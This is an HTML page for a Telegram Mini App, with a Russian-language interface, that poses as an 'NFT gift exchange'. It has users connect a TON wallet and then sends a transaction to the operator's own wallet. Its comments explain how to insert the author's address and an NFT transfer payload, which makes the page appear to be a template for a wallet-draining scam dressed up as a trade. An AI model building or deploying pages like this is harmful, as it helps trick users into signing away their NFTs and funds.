<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Exchange Mini App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #182533;
            color: white;
            text-align: center;
            padding: 20px;
        }
        #ton-connect-btn {
            margin: 20px auto;
            display: inline-block;
        }
        .btn-send {
            background-color: #2481cc;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 8px;
            font-size: 16px;
            cursor: pointer;
            display: none; /* Покажем только после подключения кошелька */
        }
    </style>
</head>
<body>

    <h2>🔄 Обмен NFT Подарков</h2>
    <p>Подключите кошелек для автоматического подтверждения сделки</p>

    <div id="ton-connect-btn"></div>

    <br>
    <button id="send-nft-btn" class="btn-send">Отправить NFT на обмен</button>

    <script>
        // Инициализация Telegram Web App
        const tg = window.Telegram.WebApp;
        tg.ready();
        tg.expand(); // Расширяем окно на весь экран

        // Инициализация TON Connect UI
        const tonConnectUI = new TONConnectUI.TonConnectUI({
            manifestUrl: 'https://raw.githubusercontent.com/ton-connect/demo-dapp/main/public/tonconnect-manifest.json', // Демо-манифест (для тестов ок)
            buttonRootId: 'ton-connect-btn'
        });

        const sendBtn = document.getElementById('send-nft-btn');

        // Следим за статусом подключения кошелька
        tonConnectUI.onStatusChange(wallet => {
            if (wallet) {
                sendBtn.style.display = 'inline-block'; // Показываем кнопку отправки
            } else {
                sendBtn.style.display = 'none';
            }
        });

        // Логика кнопки отправки транзакции
        sendBtn.addEventListener('click', async () => {
            // Шаблон транзакции (в реальном проекте сюда подставляется адрес твоего кошелька и данные NFT)
            const transaction = {
                validUntil: Math.floor(Date.now() / 1000) + 60, // Срок действия 60 секунд
                messages: [
                    {
                        address: "EQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAM9c", // Твой TON кошелек (куда уйдет перевод)
                        amount: "10000000" // Сумма комиссии в нано-ТОН (0.01 TON)
                        // Для отправки именно NFT сюда добавляется специальный payload (payload архитектуры TON NFT)
                    }
                ]
            };

            try {
                // Вызываем окно кошелька у пользователя
                const result = await tonConnectUI.sendTransaction(transaction);
                alert("Транзакция отправлена! Хэш: " + result.boc);
                tg.close(); // Закрываем Mini App после успеха
            } catch (e) {
                console.error(e);
                alert("Ошибка или отмена транзакции.");
            }
        });
    </script>
</body>
</html>
